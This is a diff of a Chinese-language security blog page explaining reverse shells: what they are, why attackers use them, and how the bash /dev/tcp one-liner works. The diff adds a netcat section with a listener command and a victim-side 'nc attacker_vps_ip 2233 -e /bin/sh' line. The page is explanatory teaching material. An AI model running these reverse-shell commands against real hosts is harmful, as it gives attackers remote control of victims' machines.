@@ -81,20 +81,20 @@
 
 
 
-<meta name="description" content="什么是反弹shell通常情况下，攻击者通过漏洞获取的shell，都是由攻击者主动发起连接，连接到受害者的主机上。 反弹shell又称反向shell，即受害者主机发起连接，连接到攻击者的主机上。 为什么需要反弹shell 受害者主机上存在WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。 受害者的IP是动态的。 受害者主机在局域网内，从外网无法直接访问。  如何实现反">
+<meta name="description" content="什么是反弹shell通常情况下，攻击者通过漏洞获取的shell，都是由攻击者主动发起连接，连接到受害者的主机上。 反弹shell又称反向shell，即受害者主机发起连接，连接到攻击者的主机上。 为什么需要反弹shell 受害者主机上存在WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。 受害者的IP是动态的。 受害者主机在局域网内，从外网无法直接访问。  bash下">
 <meta name="keywords" content="Security,Reverse-shell">
 <meta property="og:type" content="article">
 <meta property="og:title" content="浅述反弹shell">
 <meta property="og:url" content="https://lovegood.github.io/2019/03/30/reverse-shell-simple/index.html">
 <meta property="og:site_name" content="Cytosineの有被小窝~">
-<meta property="og:description" content="什么是反弹shell通常情况下，攻击者通过漏洞获取的shell，都是由攻击者主动发起连接，连接到受害者的主机上。 反弹shell又称反向shell，即受害者主机发起连接，连接到攻击者的主机上。 为什么需要反弹shell 受害者主机上存在WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。 受害者的IP是动态的。 受害者主机在局域网内，从外网无法直接访问。  如何实现反">
+<meta property="og:description" content="什么是反弹shell通常情况下，攻击者通过漏洞获取的shell，都是由攻击者主动发起连接，连接到受害者的主机上。 反弹shell又称反向shell，即受害者主机发起连接，连接到攻击者的主机上。 为什么需要反弹shell 受害者主机上存在WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。 受害者的IP是动态的。 受害者主机在局域网内，从外网无法直接访问。  bash下">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://lovegood.github.io/2019/03/30/reverse-shell-simple/0.png">
 <meta property="og:image" content="https://lovegood.github.io/2019/03/30/reverse-shell-simple/1.png">
-<meta property="og:updated_time" content="2019-03-31T09:33:56.000Z">
+<meta property="og:updated_time" content="2021-06-23T07:09:22.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="浅述反弹shell">
-<meta name="twitter:description" content="什么是反弹shell通常情况下，攻击者通过漏洞获取的shell，都是由攻击者主动发起连接，连接到受害者的主机上。 反弹shell又称反向shell，即受害者主机发起连接，连接到攻击者的主机上。 为什么需要反弹shell 受害者主机上存在WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。 受害者的IP是动态的。 受害者主机在局域网内，从外网无法直接访问。  如何实现反">
+<meta name="twitter:description" content="什么是反弹shell通常情况下，攻击者通过漏洞获取的shell，都是由攻击者主动发起连接，连接到受害者的主机上。 反弹shell又称反向shell，即受害者主机发起连接，连接到攻击者的主机上。 为什么需要反弹shell 受害者主机上存在WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。 受害者的IP是动态的。 受害者主机在局域网内，从外网无法直接访问。  bash下">
 <meta name="twitter:image" content="https://lovegood.github.io/2019/03/30/reverse-shell-simple/0.png">
 
 
@@ -316,7 +316,7 @@
 <li>受害者的IP是动态的。</li>
 <li>受害者主机在局域网内，从外网无法直接访问。</li>
 </ol>
-<h1 id="如何实现反弹shell"><a href="#如何实现反弹shell" class="headerlink" title="如何实现反弹shell"></a>如何实现反弹shell</h1><p>能够实现反弹shell的命令/代码千变万化，这里只选取最常见的形式，简单讲一下原理。</p>
+<h1 id="bash下如何实现反弹shell"><a href="#bash下如何实现反弹shell" class="headerlink" title="bash下如何实现反弹shell"></a>bash下如何实现反弹shell</h1><p>能够实现反弹shell的命令/代码千变万化，这里只选取最常见的形式，简单讲一下原理。</p>
 <p>形式：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</div></pre></td></tr></table></figure>
 <p>例如，攻击者IP 192.168.1.188，攻击者监听的端口 2333：</p>
@@ -346,6 +346,10 @@
 <p><img src="0.png" alt=""></p>
 <p>尝试执行一些命令：</p>
 <p><img src="1.png" alt=""></p>
+<h1 id="其他环境中使用反弹shell"><a href="#其他环境中使用反弹shell" class="headerlink" title="其他环境中使用反弹shell"></a>其他环境中使用反弹shell</h1><h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><p>攻击者vps上nc监听对应ip、port</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvnp 2233</div></pre></td></tr></table></figure>
+<p>受害者主机上执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc attacker_vps_ip 2233 -e /bin/sh</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -735,7 +739,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么是反弹shell"><span class="nav-number">1.</span> <span class="nav-text">什么是反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#为什么需要反弹shell"><span class="nav-number">2.</span> <span class="nav-text">为什么需要反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#如何实现反弹shell"><span class="nav-number">3.</span> <span class="nav-text">如何实现反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bash-i"><span class="nav-number">3.1.</span> <span class="nav-text">bash -i</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gt"><span class="nav-number">3.2.</span> <span class="nav-text">></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gt-amp-amp-gt"><span class="nav-number">3.3.</span> <span class="nav-text">>&/&></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dev-tcp-ip-port"><span class="nav-number">3.4.</span> <span class="nav-text">/dev/tcp/ip/port</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bash-i-gt-amp-dev-tcp-ip-port"><span class="nav-number">3.5.</span> <span class="nav-text">bash -i >& /dev/tcp/ip/port</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0-gt-amp-1"><span class="nav-number">3.6.</span> <span class="nav-text">0>&1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验一下"><span class="nav-number">4.</span> <span class="nav-text">实验一下</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么是反弹shell"><span class="nav-number">1.</span> <span class="nav-text">什么是反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#为什么需要反弹shell"><span class="nav-number">2.</span> <span class="nav-text">为什么需要反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bash下如何实现反弹shell"><span class="nav-number">3.</span> <span class="nav-text">bash下如何实现反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bash-i"><span class="nav-number">3.1.</span> <span class="nav-text">bash -i</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gt"><span class="nav-number">3.2.</span> <span class="nav-text">></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gt-amp-amp-gt"><span class="nav-number">3.3.</span> <span class="nav-text">>&/&></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dev-tcp-ip-port"><span class="nav-number">3.4.</span> <span class="nav-text">/dev/tcp/ip/port</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bash-i-gt-amp-dev-tcp-ip-port"><span class="nav-number">3.5.</span> <span class="nav-text">bash -i >& /dev/tcp/ip/port</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0-gt-amp-1"><span class="nav-number">3.6.</span> <span class="nav-text">0>&1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验一下"><span class="nav-number">4.</span> <span class="nav-text">实验一下</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#其他环境中使用反弹shell"><span class="nav-number">5.</span> <span class="nav-text">其他环境中使用反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#netcat"><span class="nav-number">5.1.</span> <span class="nav-text">netcat</span></a></li></ol></li></ol></div>
             
 
           </div>
